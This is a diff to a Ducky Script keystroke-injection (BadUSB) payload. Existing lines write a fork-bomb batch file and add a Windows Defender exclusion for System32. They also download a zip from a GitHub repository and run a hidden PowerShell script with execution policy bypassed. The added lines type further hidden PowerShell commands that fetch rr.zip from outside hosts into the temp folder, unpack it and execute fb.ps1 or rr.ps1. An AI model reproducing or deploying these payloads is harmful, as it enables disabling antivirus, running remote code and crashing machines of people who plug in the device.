@@ -16,5 +16,7 @@ SHIFT TAB
 DELAY 500
 ENTER
 DELAY 1500
+STRING powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Misc/rr.zip';$Z="$env:TMP"+'\rr.zip';$D="$env:TMP"+'\rr';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;powershell $D\fb.ps1
 STRING echo %0^|%0 > fb.bat&&powershell -w h Add-MpPreference -ExclusionPath C:\Windows\system32;;curl https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Misc/rr.zip -OutFile rr.zip;;Expand-Archive -Path C:\Windows\System32\rr.zip -Force;;powershell -w h -Exec Bypass C:\Windows\System32\rr\fb.ps1
 ENTER
+STRING powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/rr.zip';$Z="$env:TMP"+'\rr.zip';$D="$env:TMP"+'\rr';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;powershell $D\rr.ps1
